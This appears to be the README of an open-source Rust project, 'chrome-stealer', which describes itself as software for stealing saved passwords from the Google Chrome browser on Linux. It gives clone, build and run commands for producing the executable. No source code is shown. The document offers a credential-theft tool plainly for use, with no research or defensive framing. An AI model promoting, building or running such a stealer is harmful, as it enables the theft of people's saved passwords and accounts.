# About
Software for stealing saved passwords from Google Chrome browser implemented in Rust.
Currently only Linux OS is supported.

# Install
You can build it from sources using `cargo` tool:
```
git clone --depth 1 https://github.com/astronmax/chrome-stealer && cd chrome-stealer
cargo build -r
cd target/release
./chrome-stealer
```
After that you'll get `chrome-stealer` executable which depends only on 
core libraries of your OS.